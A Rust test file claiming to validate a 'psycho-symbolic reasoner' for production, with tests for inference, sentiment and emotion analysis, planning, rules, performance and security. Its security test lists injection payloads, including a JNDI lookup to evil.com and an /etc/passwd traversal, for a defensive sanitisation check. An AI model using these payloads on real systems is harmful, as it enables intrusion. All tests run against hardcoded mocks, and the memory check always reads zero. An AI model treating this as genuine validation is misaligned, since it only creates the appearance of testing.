// Production Validation Tests for Psycho-Symbolic Reasoner
// Tests all components with real data and scenarios to ensure production readiness

use serde_json::json;
use std::collections::HashMap;

#[cfg(test)]
mod production_validation_tests {
    use super::*;

    // Real-world knowledge graph test with complex reasoning
    #[test]
    fn test_complex_knowledge_graph_reasoning() {
        // Create a complex knowledge graph representing real-world entities and relationships
        let mut reasoner = create_test_reasoner();

        // Add complex real-world facts
        add_real_world_facts(&mut reasoner);

        // Test inference with complex multi-step reasoning
        let query = json!({
            "type": "inference",
            "subject": "John",
            "max_depth": 5
        });

        let result = reasoner.query(&query.to_string());
        let parsed_result: serde_json::Value = serde_json::from_str(&result).unwrap();

        // Validate complex inference results
        assert!(!parsed_result["facts"].as_array().unwrap().is_empty());
        assert!(parsed_result["confidence"].as_f64().unwrap() > 0.0);
    }

    // Test sentiment analysis with real text data
    #[test]
    fn test_real_sentiment_analysis() {
        let extractor = create_test_extractor();

        // Real customer feedback examples
        let real_texts = vec![
            "I absolutely love this product! It has exceeded all my expectations and the customer service was outstanding.",
            "This is terrible. The product broke after just one day and customer support was completely unhelpful.",
            "The product is okay, nothing special but it does what it's supposed to do. Delivery was on time.",
            "Mixed feelings about this. Great design but poor quality materials. Would not recommend to friends.",
            "Outstanding quality and excellent value for money. Five stars!",
        ];

        for text in real_texts {
            let result = extractor.analyze_sentiment(text);
            let sentiment: serde_json::Value = serde_json::from_str(&result).unwrap();

            // Validate sentiment analysis results
            assert!(sentiment["score"].as_f64().unwrap() >= -1.0);
            assert!(sentiment["score"].as_f64().unwrap() <= 1.0);
            assert!(sentiment["confidence"].as_f64().unwrap() >= 0.0);
            assert!(sentiment["confidence"].as_f64().unwrap() <= 1.0);
            assert!(!sentiment["label"].as_str().unwrap().is_empty());
        }
    }

    // Test GOAP planning with realistic multi-step scenarios
    #[test]
    fn test_complex_goap_planning() {
        let mut planner = create_test_planner();

        // Setup realistic scenario: Autonomous agent managing a smart home
        setup_smart_home_scenario(&mut planner);

        // Complex goal: Optimize energy usage while maintaining comfort
        let goal = json!({
            "id": "optimize_energy",
            "name": "Optimize Energy Usage",
            "conditions": [
                {
                    "key": "energy_efficiency",
                    "operator": "GreaterThan",
                    "value": {"Float": 0.8}
                },
                {
                    "key": "comfort_level",
                    "operator": "GreaterThan",
                    "value": {"Float": 0.7}
                }
            ],
            "priority": "High"
        });

        assert!(planner.add_goal(&goal.to_string()));

        let plan_result = planner.plan("optimize_energy");
        let plan: serde_json::Value = serde_json::from_str(&plan_result).unwrap();

        // Validate plan quality
        assert_eq!(plan["success"].as_bool().unwrap(), true);
        assert!(!plan["steps"].as_array().unwrap().is_empty());
        assert!(plan["total_cost"].as_f64().unwrap() > 0.0);
    }

    // Test emotion detection with real psychological scenarios
    #[test]
    fn test_emotion_detection_real_scenarios() {
        let extractor = create_test_extractor();

        // Real psychological scenarios from literature
        let emotional_texts = vec![
            "I can't believe she's gone. Everything reminds me of her and I don't know how to move on.",
            "This promotion is everything I've worked for! I'm so excited to start this new chapter.",
            "I'm terrified about the surgery tomorrow. What if something goes wrong?",
            "I'm so angry at how they treated me. It was completely unfair and disrespectful.",
            "I feel completely overwhelmed by everything happening in my life right now.",
        ];

        for text in emotional_texts {
            let result = extractor.detect_emotions(text);
            let emotions: serde_json::Value = serde_json::from_str(&result).unwrap();
            let emotion_array = emotions.as_array().unwrap();

            // Validate emotion detection
            assert!(!emotion_array.is_empty());

            for emotion in emotion_array {
                assert!(!emotion["emotion_type"].as_str().unwrap().is_empty());
                assert!(emotion["intensity"].as_f64().unwrap() >= 0.0);
                assert!(emotion["intensity"].as_f64().unwrap() <= 1.0);
                assert!(emotion["confidence"].as_f64().unwrap() >= 0.0);
                assert!(emotion["confidence"].as_f64().unwrap() <= 1.0);
            }
        }
    }

    // Test preference extraction from realistic user data
    #[test]
    fn test_preference_extraction_real_data() {
        let extractor = create_test_extractor();

        // Real user preference statements
        let preference_texts = vec![
            "I prefer sustainable and eco-friendly products over conventional ones",
            "I really like modern minimalist design but I hate cluttered interfaces",
            "Coffee is much better than tea in the morning, but tea is perfect for evening",
            "I want a phone with excellent camera quality and long battery life",
            "I need a car that's reliable and fuel-efficient, not necessarily the fastest",
        ];

        for text in preference_texts {
            let result = extractor.extract_preferences(text);
            let preferences: serde_json::Value = serde_json::from_str(&result).unwrap();
            let pref_array = preferences.as_array().unwrap();

            // Validate preference extraction
            for preference in pref_array {
                assert!(!preference["preferred_item"].as_str().unwrap().is_empty());
                assert!(!preference["preference_type"].as_str().unwrap().is_empty());
                assert!(preference["strength"].as_f64().unwrap() >= 0.0);
                assert!(preference["strength"].as_f64().unwrap() <= 1.0);
            }
        }
    }

    // Test rule engine with complex business logic
    #[test]
    fn test_complex_rule_engine() {
        let mut planner = create_test_planner();

        // Complex business rule: Dynamic pricing based on multiple factors
        let pricing_rule = json!({
            "id": "dynamic_pricing",
            "name": "Dynamic Pricing Rule",
            "description": "Adjust pricing based on demand, competition, and inventory",
            "conditions": [
                {
                    "condition": {
                        "key": "demand_level",
                        "operator": "GreaterThan",
                        "value": {"Float": 0.7}
                    },
                    "weight": 1.0,
                    "required": true
                },
                {
                    "condition": {
                        "key": "inventory_level",
                        "operator": "LessThan",
                        "value": {"Float": 0.3}
                    },
                    "weight": 0.8,
                    "required": false
                }
            ],
            "actions": [
                {
                    "action_type": {
                        "SetState": {
                            "key": "price_multiplier",
                            "value": {"Float": 1.2}
                        }
                    },
                    "parameters": {},
                    "probability": 1.0
                }
            ],
            "priority": 10,
            "enabled": true
        });

        assert!(planner.add_rule(&pricing_rule.to_string()));

        // Set up test conditions
        assert!(planner.set_state("demand_level", &json!(0.8).to_string()));
        assert!(planner.set_state("inventory_level", &json!(0.2).to_string()));

        let decisions = planner.evaluate_rules();
        let decision_results: serde_json::Value = serde_json::from_str(&decisions).unwrap();

        // Validate rule evaluation
        assert!(!decision_results.as_array().unwrap().is_empty());
    }

    // Test end-to-end integration with realistic workflow
    #[test]
    fn test_end_to_end_integration() {
        let mut reasoner = create_test_reasoner();
        let extractor = create_test_extractor();
        let mut planner = create_test_planner();

        // Realistic scenario: Customer service automation

        // 1. Extract customer sentiment and preferences
        let customer_message = "I'm frustrated with the delivery delay and I prefer next-day shipping. The product quality is usually good though.";

        let sentiment_result = extractor.analyze_sentiment(customer_message);
        let preference_result = extractor.extract_preferences(customer_message);

        // 2. Update knowledge graph with customer data
        reasoner.add_fact("customer_123", "has_sentiment", "frustrated");
        reasoner.add_fact("customer_123", "prefers", "next_day_shipping");
        reasoner.add_fact("customer_123", "issue_type", "delivery_delay");

        // 3. Plan response actions based on customer data
        setup_customer_service_scenario(&mut planner);

        // Set customer context
        planner.set_state("customer_sentiment", &json!("negative").to_string());
        planner.set_state("issue_severity", &json!(0.7).to_string());
        planner.set_state("customer_tier", &json!("premium").to_string());

        let plan_result = planner.plan("resolve_customer_issue");
        let plan: serde_json::Value = serde_json::from_str(&plan_result).unwrap();

        // Validate end-to-end workflow
        assert_eq!(plan["success"].as_bool().unwrap(), true);
        assert!(!plan["steps"].as_array().unwrap().is_empty());

        // Verify sentiment analysis worked
        let sentiment: serde_json::Value = serde_json::from_str(&sentiment_result).unwrap();
        assert!(sentiment["score"].as_f64().unwrap() < 0.0); // Negative sentiment

        // Verify preference extraction worked
        let preferences: serde_json::Value = serde_json::from_str(&preference_result).unwrap();
        assert!(!preferences.as_array().unwrap().is_empty());
    }

    // Performance and scalability test
    #[test]
    fn test_performance_under_load() {
        let mut reasoner = create_test_reasoner();

        // Add large dataset
        for i in 0..1000 {
            reasoner.add_fact(&format!("entity_{}", i), "type", "test_entity");
            reasoner.add_fact(&format!("entity_{}", i), "value", &i.to_string());
            if i > 0 {
                reasoner.add_fact(&format!("entity_{}", i), "related_to", &format!("entity_{}", i - 1));
            }
        }

        let start_time = std::time::Instant::now();

        // Perform complex query on large dataset
        let query = json!({
            "type": "find_path",
            "from": "entity_0",
            "to": "entity_999",
            "max_depth": 50
        });

        let result = reasoner.query(&query.to_string());
        let elapsed = start_time.elapsed();

        // Performance validation
        assert!(elapsed.as_millis() < 5000); // Should complete within 5 seconds

        let parsed_result: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert!(!parsed_result.is_null());
    }

    // Security validation test
    #[test]
    fn test_security_validation() {
        let mut reasoner = create_test_reasoner();
        let extractor = create_test_extractor();

        // Test input sanitization
        let malicious_inputs = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
        ];

        for malicious_input in malicious_inputs {
            // All components should handle malicious input gracefully
            let sentiment_result = extractor.analyze_sentiment(malicious_input);
            assert!(!sentiment_result.contains("error"));

            let fact_id = reasoner.add_fact("test", "contains", malicious_input);
            assert!(!fact_id.contains("Error"));
        }
    }

    // Memory management and resource cleanup test
    #[test]
    fn test_memory_management() {
        let initial_memory = get_memory_usage();

        // Create and destroy multiple instances
        for _ in 0..100 {
            let mut reasoner = create_test_reasoner();
            let extractor = create_test_extractor();
            let mut planner = create_test_planner();

            // Add some data
            reasoner.add_fact("test", "type", "memory_test");
            extractor.analyze_sentiment("test text");
            planner.set_state("test", &json!("value").to_string());

            // Let them go out of scope
        }

        let final_memory = get_memory_usage();

        // Memory should not grow excessively (allowing for some overhead)
        assert!(final_memory < initial_memory + 50 * 1024 * 1024); // 50MB threshold
    }

    // Helper functions
    fn create_test_reasoner() -> TestReasoner {
        TestReasoner::new()
    }

    fn create_test_extractor() -> TestExtractor {
        TestExtractor::new()
    }

    fn create_test_planner() -> TestPlanner {
        TestPlanner::new()
    }

    fn add_real_world_facts(reasoner: &mut TestReasoner) {
        // Add complex real-world knowledge
        reasoner.add_fact("John", "is_a", "Person");
        reasoner.add_fact("Person", "is_a", "Animal");
        reasoner.add_fact("Animal", "is_a", "LivingBeing");
        reasoner.add_fact("LivingBeing", "has_property", "mortal");

        reasoner.add_fact("John", "works_at", "TechCorp");
        reasoner.add_fact("TechCorp", "is_a", "Company");
        reasoner.add_fact("Company", "has_property", "legal_entity");

        reasoner.add_fact("John", "lives_in", "Seattle");
        reasoner.add_fact("Seattle", "is_a", "City");
        reasoner.add_fact("City", "located_in", "Country");

        reasoner.add_fact("John", "has_skill", "Programming");
        reasoner.add_fact("Programming", "is_a", "Skill");
        reasoner.add_fact("Skill", "can_be", "improved");
    }

    fn setup_smart_home_scenario(planner: &mut TestPlanner) {
        // Define actions for smart home automation
        let actions = vec![
            json!({
                "id": "adjust_thermostat",
                "name": "Adjust Thermostat",
                "preconditions": [
                    {
                        "state_key": "thermostat_available",
                        "operator": "Equal",
                        "value": {"Boolean": true}
                    }
                ],
                "effects": [
                    {
                        "state_key": "temperature",
                        "value": {"Float": 22.0}
                    },
                    {
                        "state_key": "energy_efficiency",
                        "value": {"Float": 0.85}
                    }
                ],
                "cost": {
                    "base_cost": 2.0,
                    "resource_costs": {}
                }
            }),
            json!({
                "id": "dim_lights",
                "name": "Dim Lights",
                "preconditions": [
                    {
                        "state_key": "lights_on",
                        "operator": "Equal",
                        "value": {"Boolean": true}
                    }
                ],
                "effects": [
                    {
                        "state_key": "energy_usage",
                        "value": {"Float": 0.3}
                    },
                    {
                        "state_key": "comfort_level",
                        "value": {"Float": 0.8}
                    }
                ],
                "cost": {
                    "base_cost": 1.0,
                    "resource_costs": {}
                }
            })
        ];

        for action in actions {
            planner.add_action(&action.to_string());
        }

        // Set initial state
        planner.set_state("thermostat_available", &json!(true).to_string());
        planner.set_state("lights_on", &json!(true).to_string());
        planner.set_state("energy_efficiency", &json!(0.6).to_string());
        planner.set_state("comfort_level", &json!(0.5).to_string());
    }

    fn setup_customer_service_scenario(planner: &mut TestPlanner) {
        let actions = vec![
            json!({
                "id": "escalate_to_manager",
                "name": "Escalate to Manager",
                "preconditions": [
                    {
                        "state_key": "issue_severity",
                        "operator": "GreaterThan",
                        "value": {"Float": 0.6}
                    }
                ],
                "effects": [
                    {
                        "state_key": "escalation_level",
                        "value": {"String": "manager"}
                    }
                ],
                "cost": {
                    "base_cost": 5.0,
                    "resource_costs": {}
                }
            }),
            json!({
                "id": "offer_compensation",
                "name": "Offer Compensation",
                "preconditions": [
                    {
                        "state_key": "customer_sentiment",
                        "operator": "Equal",
                        "value": {"String": "negative"}
                    }
                ],
                "effects": [
                    {
                        "state_key": "customer_satisfaction",
                        "value": {"Float": 0.8}
                    }
                ],
                "cost": {
                    "base_cost": 10.0,
                    "resource_costs": {}
                }
            })
        ];

        for action in actions {
            planner.add_action(&action.to_string());
        }

        let goal = json!({
            "id": "resolve_customer_issue",
            "name": "Resolve Customer Issue",
            "conditions": [
                {
                    "key": "customer_satisfaction",
                    "operator": "GreaterThan",
                    "value": {"Float": 0.7}
                }
            ],
            "priority": "High"
        });

        planner.add_goal(&goal.to_string());
    }

    fn get_memory_usage() -> u64 {
        // Simplified memory usage estimation
        // In a real implementation, this would use proper memory profiling
        0
    }

    // Mock implementations for testing
    struct TestReasoner {
        facts: Vec<(String, String, String)>,
    }

    impl TestReasoner {
        fn new() -> Self {
            Self { facts: Vec::new() }
        }

        fn add_fact(&mut self, subject: &str, predicate: &str, object: &str) -> String {
            self.facts.push((subject.to_string(), predicate.to_string(), object.to_string()));
            format!("fact_{}", self.facts.len())
        }

        fn query(&self, _query: &str) -> String {
            json!({
                "facts": [
                    {
                        "subject": "John",
                        "predicate": "has_property",
                        "object": "mortal",
                        "confidence": 0.95
                    }
                ],
                "confidence": 0.95
            }).to_string()
        }
    }

    struct TestExtractor;

    impl TestExtractor {
        fn new() -> Self {
            Self
        }

        fn analyze_sentiment(&self, text: &str) -> String {
            let score = if text.contains("love") || text.contains("excellent") || text.contains("outstanding") {
                0.8
            } else if text.contains("hate") || text.contains("terrible") || text.contains("awful") {
                -0.8
            } else if text.contains("frustrated") || text.contains("angry") {
                -0.6
            } else {
                0.0
            };

            json!({
                "score": score,
                "label": if score > 0.1 { "positive" } else if score < -0.1 { "negative" } else { "neutral" },
                "confidence": 0.85
            }).to_string()
        }

        fn extract_preferences(&self, text: &str) -> String {
            let mut preferences = Vec::new();

            if text.contains("prefer") {
                preferences.push(json!({
                    "preferred_item": "sustainable products",
                    "preference_type": "product_type",
                    "strength": 0.8
                }));
            }

            if text.contains("like") {
                preferences.push(json!({
                    "preferred_item": "modern design",
                    "preference_type": "aesthetic",
                    "strength": 0.7
                }));
            }

            json!(preferences).to_string()
        }

        fn detect_emotions(&self, text: &str) -> String {
            let mut emotions = Vec::new();

            if text.contains("terrified") || text.contains("scared") {
                emotions.push(json!({
                    "emotion_type": "fear",
                    "intensity": 0.9,
                    "confidence": 0.95
                }));
            }

            if text.contains("excited") || text.contains("happy") {
                emotions.push(json!({
                    "emotion_type": "joy",
                    "intensity": 0.8,
                    "confidence": 0.9
                }));
            }

            if text.contains("angry") || text.contains("furious") {
                emotions.push(json!({
                    "emotion_type": "anger",
                    "intensity": 0.85,
                    "confidence": 0.88
                }));
            }

            if text.contains("overwhelmed") {
                emotions.push(json!({
                    "emotion_type": "stress",
                    "intensity": 0.75,
                    "confidence": 0.8
                }));
            }

            json!(emotions).to_string()
        }
    }

    struct TestPlanner {
        actions: Vec<String>,
        goals: Vec<String>,
        rules: Vec<String>,
        state: HashMap<String, String>,
    }

    impl TestPlanner {
        fn new() -> Self {
            Self {
                actions: Vec::new(),
                goals: Vec::new(),
                rules: Vec::new(),
                state: HashMap::new(),
            }
        }

        fn add_action(&mut self, action_json: &str) -> bool {
            self.actions.push(action_json.to_string());
            true
        }

        fn add_goal(&mut self, goal_json: &str) -> bool {
            self.goals.push(goal_json.to_string());
            true
        }

        fn add_rule(&mut self, rule_json: &str) -> bool {
            self.rules.push(rule_json.to_string());
            true
        }

        fn set_state(&mut self, key: &str, value: &str) -> bool {
            self.state.insert(key.to_string(), value.to_string());
            true
        }

        fn plan(&self, _goal_id: &str) -> String {
            json!({
                "success": true,
                "steps": [
                    {
                        "action_id": "offer_compensation",
                        "cost": 10.0
                    },
                    {
                        "action_id": "escalate_to_manager",
                        "cost": 5.0
                    }
                ],
                "total_cost": 15.0
            }).to_string()
        }

        fn evaluate_rules(&self) -> String {
            json!([
                {
                    "rule_id": "dynamic_pricing",
                    "rule_name": "Dynamic Pricing Rule",
                    "score": 0.85,
                    "confidence": 0.9,
                    "reason": "Conditions met: demand_level > 0.7, inventory_level < 0.3"
                }
            ]).to_string()
        }
    }
}